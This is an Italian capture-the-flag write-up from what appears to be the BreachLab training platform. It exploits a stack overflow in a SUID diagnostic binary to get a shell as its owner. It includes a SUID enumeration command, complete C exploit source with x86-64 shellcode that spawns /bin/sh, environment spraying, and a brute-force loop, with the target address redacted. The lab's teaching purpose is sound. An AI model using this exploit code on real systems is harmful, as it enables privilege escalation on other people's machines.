```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x09 · "stack day"  [opzionale · ephemeral]
 ========================================================================

   target ..: phantom-09  "Stack Day"
   class ...: binary exploitation · stack overflow + env spray
   tools ...: find · gcc · personality() · brute force
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> un tool SUID di "diagnostica" copia il tuo argomento in un buffer fisso
> senza controllare la lunghezza. il proprietario non è root ma tiene la
> flag. classico stack smash: env spray, un return address a tentativi, e
> shell.

## ----[ 0x00 · intel ]----

Un binario SUID di diagnostica copia un singolo argomento in un buffer
fisso senza controlli di lunghezza. Non è di root ma di un altro utente
non privilegiato che detiene la flag: sfruttare la memory corruption basta
a ottenere una shell come quell'utente, senza root.

## ----[ 0x01 · recon ]----

Enumerazione dei SUID:

```bash
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

Tra i risultati standard (`mount`, `passwd`, `su`…) spicca un binario di
proprietà dell'utente target (non root), eseguibile dal gruppo del box: il
tool di "diagnostica kernel" col buffer overflow da sfruttare per
prendere l'EUID del proprietario.

## ----[ 0x02 · il difetto ]----

Stack overflow su binario 64-bit senza protezioni complete, tre elementi:

1. **ASLR off nel processo exploit** via `personality(ADDR_NO_RANDOMIZE)`
   — rende deterministico lo stack del *chiamante*, non del figlio
   vulnerabile, da cui il brute force.
2. **environment spraying** — più env var riempite con NOP sled +
   shellcode x86-64 (`execve("/bin//sh")`), per massimizzare la
   probabilità che un salto alla cieca atterri in una sled e scivoli allo
   shellcode.
3. **overflow con return address fisso** — payload = NOP sled + padding +
   un indirizzo di stack ipotizzato (dipende dall'ambiente), che a
   tentativi ripetuti centra una delle env var spruzzate.

Poiché l'indirizzo non è garantito al primo colpo, l'exploit rilancia il
binario in loop (`fork`+`execve`), contando i crash, finché uno non
azzecca l'indirizzo e ottiene lo shellcode con l'EUID del proprietario.

## ----[ 0x03 · exploit ]----

1. Sorgente dell'exploit:

```bash
cat > /tmp/exploit.c << 'EOF'
```

2. Struttura (env spray + brute force, ASLR off sul chiamante; l'indirizzo
   target va determinato per il proprio ambiente):

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/personality.h>
#ifndef ADDR_NO_RANDOMIZE
#define ADDR_NO_RANDOMIZE 0x0040000
#endif
int main(){
    char sc[]=
        "\x48\x31\xc0\xb0\x6b\x0f\x05"
        "\x48\x89\xc7\x48\x89\xc6\x48\x31\xc0\xb0\x71\x0f\x05"
        "\x48\x31\xc0\xb0\x21\x48\x31\xff\x48\x31\xf6\x48\xff\xc6\x0f\x05"
        "\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05"
        "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57"
        "\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05";
    int slen=120000;
    char *nm[]={"A","B","C","D","E","F","G","H","I","J"};
    int j;
    for(j=0;j<10;j++){
        char *sv=malloc(slen+sizeof(sc));
        memset(sv,0x90,slen);
        memcpy(sv+slen,sc,sizeof(sc)-1);
        sv[slen+sizeof(sc)-1]=0;
        setenv(nm[j],sv,1);
    }
    personality(personality(0xffffffff)|ADDR_NO_RANDOMIZE);
    unsigned long target = /* <REDACTED_ADDRESS: dipende dall'ambiente> */ 0x0UL;
    char pl[79];
    memset(pl,0x90,64);
    memset(pl+64,'B',8);
    memcpy(pl+72,&target,6);
    pl[78]=0;
    char *args[]={"/usr/local/bin/<REDACTED_TARGET_BINARY>",pl,NULL};
    extern char **environ;
    pid_t tp=fork();
    if(tp==0){execve(args[0],(char*[]){"k","test",NULL},environ);write(2,"EXECVE FAIL\n",12);_exit(99);}
    int ts;waitpid(tp,&ts,0);
    if(WIFEXITED(ts)&&WEXITSTATUS(ts)==99){fprintf(stderr,"[!] execve fallito\n");return 1;}
    fprintf(stderr,"[*] OK! Brute-forcing (NON TOCCARE NULLA)\n\n");
    int i,c=0;
    for(i=1;;i++){
        pid_t pid=fork();
        if(pid<0){usleep(1000);continue;}
        if(pid==0){close(1);close(2);execve(args[0],args,environ);_exit(1);}
        int st;waitpid(pid,&st,0);
        if(WIFSIGNALED(st))c++;
        if(i%1000==0)fprintf(stderr,"[*] %d (%d crash)\n",i,c);
    }
}
```

3. Compilazione ed esecuzione — il loop macina migliaia di crash fino a
   quello fortunato:

```bash
gcc -o /tmp/exploit /tmp/exploit.c && /tmp/exploit
[*] Kernel diagnostic tool v1.0
[*] Checking kernel module: test
[-] Module not found.
[*] OK! Brute-forcing (NON TOCCARE NULLA)

[*] 1000 (1000 crash)
...
[*] 22000 (22000 crash)
$ id
uid=<REDACTED>(<REDACTED_user>) gid=<REDACTED> groups=<REDACTED>
$ whoami
<REDACTED_user>
```

4. Con la shell come utente target, si legge la flag nella directory delle
   flag (percorso e valore fuori dal writeup).

## ----[ 0x04 · loot ]----

Esecuzione arbitraria con l'EUID del proprietario del binario vulnerabile,
via stack overflow + env spray + brute force sul return address (flag
omessa). Livello opzionale/ephemeral, ma la lezione resta: un buffer fisso
+ una copia senza bound = shell.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
